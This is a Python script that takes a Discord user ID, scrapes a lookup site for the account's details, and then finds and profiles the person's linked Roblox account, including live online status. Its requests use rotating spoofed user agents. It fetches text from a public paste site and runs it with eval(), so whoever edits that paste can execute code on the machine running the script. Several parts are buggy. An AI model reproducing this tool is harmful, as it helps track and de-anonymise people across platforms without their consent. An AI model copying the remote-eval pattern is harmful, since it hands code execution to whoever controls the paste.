
print("Init.\n")
displayimages=False #self explanatory, unsupported on cloud/web shells (repl.it etc)
enableColorama=True #enable colorful text with colorama
usertor=True #(I forgor :Skull:)
maxcachesize=10 #max image cache size
import requests
import subprocess
import random
import re
from datetime import datetime

import textwrap
from datetime import datetime
import secrets
import sys

import os
import io,base64
import time
from os.path import exists

if enableColorama==True:
 try: colorama
 except NameError: 
   try: from colorama import Fore, Back, Style
   except ImportError:
    print("Installing COLORAMA")
    (subprocess.getoutput("pip install colorama"))
    from colorama import Fore, Back, Style
 colorgreen=Fore.GREEN
 colorred=Fore.RED
 coloryellow=Fore.YELLOW
 resetcolor=Style.RESET_ALL
else:
  colorgreen=""
  colorred=""
  coloryellow=""
  resetcolor=""

if displayimages==True:
 try: IPython

 except NameError: 
  try: import IPython.display 
  except ImportError:
   print("Installing IPYTHON.")
   print(subprocess.getoutput("pip install ipython"))
   print(subprocess.getoutput("pip install pillow"))
   import IPython.display 
   from IPython.display import IFrame
   from IPython.display import display
   from PIL import Image,ImageDraw




imgs=[]
totalsize=0
if not os.path.exists("imgcache")==True:
  os.mkdir("imgcache")

  for item in os.listdir("imgcache"):
  
   imgs.insert(0,[str(item),os.path.getsize(os.path.join("imgcache",str(item))) / (1024 * 1024)])
   totalsize=totalsize+(os.path.getsize(os.path.join("imgcache",str(item))) / (1024 * 1024))
  if totalsize>maxcachesize:
   for item in imgs:
    os.remove(item[0])

def disimg(link): #a function to display images
 if displayimages==True:
  if not os.path.exists("imagecache"):
    os.mkdir("imagecache")
  lhash = hash(link)
  name = os.path.join("imagecache",str(lhash)+".png")
  r=requests.get(link,headers={"user-agent":str(getuseragent()),"Upgrade":"TLS/1.2","Connection":"close"})
 
  r.close()
  if r:
   if not os.path.exists(name):

    data=r.content

    f = open(name,'wb')

    f.write(data)
    f.close()
  
   IPython.display.display(Image.open(name))
  else:
    return("")

#MOM: "WHY IS THERE POLICE OUTSIDE?"
useragentdb=requests.get("https://pastebin.pl/view/raw/8c1dc269",timeout=10)
useragentdb.close()
if useragentdb:
  if useragentdb.status_code==200:
    useragents=eval(useragentdb.text)
    def getuseragent():
      a = random.choice(useragents)
      return a
  else:
    def getuseragent():
#MOMMAIMACRMINAL
     return "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8"
ua = {"user-agent":random.choice(useragents)}
#mommaimacriminal


#----------------------------------------

id=input("Insert a discord id: ")
print("")
def getuserinfo(id):
 domain="https://www.discoid.cc/" #criminal
 domain2="https://lookupguru.herokuapp.com/lookup" #mommaimacriminal
 eryn="https://verify.eryn.io/api/user/"
 robloxapi="https://users.roblox.com/v1/users/"
 robloxapi2="https://api.roblox.com/users/"
 robloxthumbnail="https://thumbnails.roblox.com/v1/users/avatar?userIds="
 l=[]
 print("Request sent... \n")
 request = requests.get(domain+id,headers={"user-agent":str(getuseragent()),"Upgrade":"TLS/1.2","Connection":"close"})
 request.close()
 erynrequest=requests.get(eryn+id,headers={"user-agent":str(getuseragent()),"Upgrade":"TLS/1.2","Connection":"close"})
 erynrequest.close()
 if request.status_code==200:
  print("Received response. \n")
  extract  = re.findall('<h5>(.*)</h5>',request.text)
  extractimage  = re.findall('<meta name="image" content="(.*)" />',request.text)[0]
  table = extract[0:5]
  if len(table)>1:
   for item in table:
    table.remove(item)
    item = item.replace("<b>","")
    item = item.replace("</b>","")
    table.insert(0,item)
    
   dic={}
   dic["id"]=table[4].split(": ")[1]
   dic["username"]=table[3].split(": ")[1]
   dic["tag"]=table[2].split(": ")[1]
   dic["isbot"]=table[1].split(": ")[1]
   dic["creation"]=table[0].split(": ")[1].split(",")
   dic["pfp"]=extractimage.split("?")[0]
   if erynrequest.status_code==200:
      json = erynrequest.json()
      dic["robloxAccount"]={}
      robloxrequest=requests.get(robloxapi+str(json["robloxId"]),headers={"user-agent":str(getuseragent()),"Upgrade":"TLS/1.2","Connection":"close"})

      robloxrequest.close()
      if robloxrequest.status_code==200:
        json = robloxrequest.json()
        for key in json.keys():
         dic["robloxAccount"][key]=json[key]
      else:
         dic["robloxAccount"]["name"]=json["robloxUsername"]
         dic["robloxAccount"]["id"]=json["robloxId"]
      robloxthumbnailrequest=requests.get(robloxthumbnail+str(dic["robloxAccount"]["id"])+"&size=250x250&format=Png&isCircular=false",headers={"user-agent":str(getuseragent()),"Upgrade":"TLS/1.2","Connection":"close"})
      robloxthumbnailrequest.close()
      if robloxthumbnailrequest.status_code==200:
        json = robloxthumbnailrequest.json()
        
        dic["robloxAccount"]["thumbnail"]=json["data"][0]["imageUrl"]    
      robloxrequest2=requests.get(robloxapi2+str(dic["robloxAccount"]["id"]),headers={"user-agent":str(getuseragent()),"Upgrade":"TLS/1.2","Connection":"close"})
      robloxrequest2.close()
      if robloxrequest2.status_code==200: 
        json = robloxrequest2.json()
        dic["robloxAccount"]["online"]=json["IsOnline"]
     
       
          
   return dic
  else:
   return {"Operation":"error!"}




get=getuserinfo(id) #returns a dict with everything

#dict info processing below

if len(get)>1:
  disimg(get["pfp"])
  for key in get.keys():
    if not key=="robloxAccount":
     print(key+":",get[key])
  if ("robloxAccount" in get.keys()):  
   print("\n  ------------------\nRoblox account: \n ")
      
   print("Username:",get["robloxAccount"]["name"],coloryellow+"("+get["robloxAccount"]["displayName"]+")"+resetcolor)
   print("Id:",get["robloxAccount"]["id"])
   if "online" in get["robloxAccount"]:
    if str(get["robloxAccount"]["online"])=="True":
      color=colorgreen
    else:
      color=""
    print(color+"IsOnline:",str(get["robloxAccount"]["online"])+resetcolor)

      
   date=str(get["robloxAccount"]["created"]).split("T")[0]
   date=date.split("-")
   delta=datetime(int(date[0]),int(date[1]),int(date[2]))
   td = datetime.today()-delta
   age = (str(td).split(",")[0])
   date.reverse()
   print("Created on:","/".join((date)),"At",str(get["robloxAccount"]["created"]).split("T")[1][:len(str(get["robloxAccount"]["created"]).split("T")[1])-5],coloryellow+". ("+age+" days ago)"+resetcolor)
   if str(get["robloxAccount"]["isBanned"])=="True":
      color=coloryellow
   else:
     color=""
   print(color+"isBanned:",str(get["robloxAccount"]["isBanned"])+resetcolor)
   print("External app display name:",get["robloxAccount"]["externalAppDisplayName"])
   print("Description:",get["robloxAccount"]["description"])
   if "thumbnail" in get["robloxAccount"]:
     disimg(get["robloxAccount"]["thumbnail"])
 


   
  

   
